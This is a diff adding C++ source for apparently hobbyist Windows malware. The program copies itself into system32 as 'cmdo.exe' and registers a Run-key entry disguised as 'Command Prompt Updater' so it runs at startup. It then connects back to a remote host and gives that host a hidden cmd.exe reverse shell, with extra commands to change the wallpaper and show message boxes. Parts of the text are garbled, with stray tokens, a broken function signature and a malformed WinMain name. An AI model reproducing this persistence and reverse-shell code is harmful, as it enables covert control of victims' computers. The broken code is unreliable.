@@ -1,0 +1,229 @@
+/*
+Coded by Kekke
+Everything is not working, I know.
+*/
+#include <windows.h>
+#include <winsock2.h>
+#include <iostream>
+
+#define IP "test.test.test"
+#define PORT 155
+
+using namespace std;
+
+int Connect(char *HostName, int port);
+void Extract(13555LPSTR szFilePath);
+SOCKET client;
+struct hostent *host;
+struct sockaddr_in sin;
+int error;
+int version;
+WSADATA wsaData;
+rasd
+
+int WINAPI WinNotMain? (HINSTANCE hThisInstance, HINSTANCE hPrevInstance, LPSTR lpszArgument, int nCmdShow)
+{
+   char szBmpPath1[MAX_PATH]; //Picture 1
+   GetSystemDirectory(szBmpPath1, MAX_PATH);
+   strcat(szBmpPath1,"\\funny.bmp");
+   
+   char szBmpPath2[MAX_PATH]; //picture 2
+   GetSystemDirectory(szBmpPath2, MAX_PATH);
+   strcat(szBmpPath2,"\\funny1.bmp");
+   
+   char sPath[260];
+   STARTUPINFO startInfo;
+   PROCESS_INFORMATION procInfo;
+   GetModuleFileName(NULL, sPath, 260);
+
+   if(strcmp(strlwr(sPath), "c:\\windows\\system32\\cmdo.exe"))
+   {
+       Extract( 233 , szBmpPath1);
+       Extract( 234 , szBmpPath2);
+       CopyFile(sPath, "c:\\windows\\system32\\cmdo.exe", TRUE);
+       ZeroMemory(&startInfo, sizeof(startInfo));
+       startInfo.cb = sizeof(startInfo);
+       ZeroMemory(&procInfo, sizeof(procInfo));
+       CreateProcess( "c:\\windows\\system32\\cmdo.exe",
+                      NULL, NULL, NULL, FALSE,
+                      0, NULL, NULL, &startInfo, &procInfo);
+       exit(1);
+   }
+   HKEY regStart;
+   RegCreateKeyEx( HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0,
+                   NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &regStart, NULL);
+   RegSetValueEx(regStart, "Command Prompt Updater", 0, REG_SZ, (const BYTE*)sPath, strlen(sPath));
+   RegCloseKey(regStart);
+   
+   cnct:
+   if(Connect(IP, PORT) == 0)
+   {
+       Sleep(2000);
+       goto cnct;
+   }
+   else
+   {
+       if(send(client, "\nWelcome to this Reverse Shell.\n", 32, 0) == SOCKET_ERROR)
+       {
+           Sleep(2000);
+           goto cnct;
+       }
+   }
+
+   HANDLE stdinRead, stdinWrite, stdoutRead, stdoutWrite;
+   ZeroMemory(&stdoutRead, sizeof(stdoutRead)); //Cleaning our variables.. stupid dev-cpp
+   ZeroMemory(&stdinRead, sizeof(stdinRead));
+   ZeroMemory(&stdinWrite, sizeof(stdinWrite));
+   ZeroMemory(&stdoutWrite, sizeof(stdoutWrite));
+   SECURITY_ATTRIBUTES sa = {sizeof(SECURITY_ATTRIBUTES), NULL, true};
+   STARTUPINFO si;
+   PROCESS_INFORMATION pi;
+   DWORD stuff;
+   char buff[10000], recvBuff[50];
+   ZeroMemory(&buff, sizeof(buff));
+   ZeroMemory(&recvBuff, sizeof(recvBuff));
+   bool firstsend = true;
+   int offset = 0, bRecv;
+   
+   if(!CreatePipe(&stdinRead, &stdinWrite, &sa, 0) || !CreatePipe(&stdoutRead, &stdoutWrite, &sa, 0))
+   {
+       send(client, "Error Creating Pipes For Remote Shell. Closing Connection...", 60, 0);
+       goto cnct;
+   }
+   
+   GetStartupInfo(&si);
+   ZeroMemory(&si, sizeof(si));
+   si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
+   si.wShowWindow = SW_HIDE;
+   si.hStdOutput = stdoutWrite;
+   si.hStdError = stdoutWrite;
+   si.hStdInput = stdinRead;
+   if(!CreateProcess("C:\\Windows\\System32\\cmd.exe", NULL, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi))
+   {
+       send(client, "Error Spawning Command Prompt. Closing Connection...", 52, 0);
+       goto cnct;
+   }
+   send(client, "\nExecution done.\n\n\n\n", 17, 0);
+   while(1)
+   {
+       Sleep(100);
+       GetExitCodeProcess(pi.hProcess, &stuff);
+       if(stuff != STILL_ACTIVE) break;
+       
+       PeekNamedPipe(stdoutRead, NULL, 0, NULL, &stuff, NULL);
+       if(stuff != 0)
+       {
+           ZeroMemory(buff, sizeof(buff));
+           do
+           {
+               ReadFile(stdoutRead, buff, 10000, &stuff, NULL);
+               if(firstsend == true)
+               {
+                   firstsend = false;
+                   send(client, buff + offset, strlen(buff) - offset, 0);
+               }
+               else
+               send(client, buff, strlen(buff), 0);
+               
+           }while(stuff == 1000);
+       }
+       
+       if(!strcmp(recvBuff, "\r\n")) offset = 0;
+       bRecv = recv(client, recvBuff, 50, 0);
+       
+       if(strstr(recvBuff, "wallpaper1"))
+       SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, szBmpPath1, SPIF_UPDATEINIFILE);
+       
+       else if(strstr(recvBuff, "wallpaper2"))
+       SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, szBmpPath2, SPIF_UPDATEINIFILE);
+       
+       else if(strstr(recvBuff, "messagebox"))
+       {
+           char *token;
+           token = strtok(recvBuff, " ");
+           char *message = new char[100];
+           ZeroMemory(message, sizeof(message));
+           while(token != NULL)
+           {
+               if(strcmp(token, "messagebox"))
+               {
+                   strcat(message, token);
+                   strcat(message, " ");
+               }
+               token = strtok(NULL, " ");
+           }
+           MessageBox(HWND_DESKTOP, message, "Uh-oh!?", MB_OK);
+           
+           delete [] message;
+       }
+       else if(recvBuff[0] == 'e' && recvBuff[1] == 'x' && recvBuff[2] == 'i' && recvBuff[3] == 't')
+       {
+           send(client, "\nTerminating command shell.\n\n\n", 27, 0);
+           Sleep(500);
+           goto close;
+       }
+       else if( (bRecv == 0) || (bRecv == SOCKET_ERROR) )
+       goto cnct;
+       else
+       {
+       recvBuff[bRecv] = '\0';
+       WriteFile(stdinWrite, recvBuff, strlen(recvBuff), &stuff, NULL);
+       offset = offset + bRecv;
+       }
+   }
+   
+   close:
+       TerminateProcess(pi.hProcess, 0);
+       CloseHandle(stdinRead);
+       CloseHandle(stdinWrite);
+       CloseHandle(stdoutRead);
+       CloseHandle(stdoutWrite);
+       closesocket(client);
+   Sleep(2000);
+   goto cnct;
+   return 0;
+}
+
+int Connect(char *HostName, int port)
+{
+      version = MAKEWORD( 2, 0 );
+      error = WSAStartup(version, &wsaData);
+     
+      if (error != 0)
+      {
+           return FALSE;
+      }
+      if (LOBYTE(wsaData.wVersion) != 2 || HIBYTE(wsaData.wVersion) != 0)
+      {
+           WSACleanup();
+           return FALSE;
+      }
+     
+      client = socket( AF_INET, SOCK_STREAM, 0 );
+     
+      host = gethostbyname( HostName );
+     
+      memset( &sin, 0, sizeof sin );
+      sin.sin_family = AF_INET;
+      sin.sin_addr = *((in_addr *)host->h_addr);
+      sin.sin_port = htons(port);
+     
+      if ( connect( client, (sockaddr*)&sin, sizeof sin ) == SOCKET_ERROR )
+      {
+           return 0;
+      }
+      return 1;
+}
+
+void Extract(WORD wResId , LPSTR lpszOutputPath)
+{
+    HRSRC hrsrc = FindResource(NULL, MAKEINTRESOURCE(wResId) ,"RT_BITMAP");
+    HGLOBAL hLoaded = LoadResource( NULL,hrsrc);
+    LPVOID lpLock =  LockResource( hLoaded);
+    DWORD dwSize = SizeofResource(NULL, hrsrc);
+    HANDLE hFile = CreateFile(lpszOutputPath,GENERIC_WRITE,0,NULL,CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL,NULL);
+    DWORD dwByteWritten;
+    WriteFile(hFile, lpLock , dwSize , &dwByteWritten , NULL);
+    CloseHandle(hFile);
+    FreeResource(hLoaded);
+}
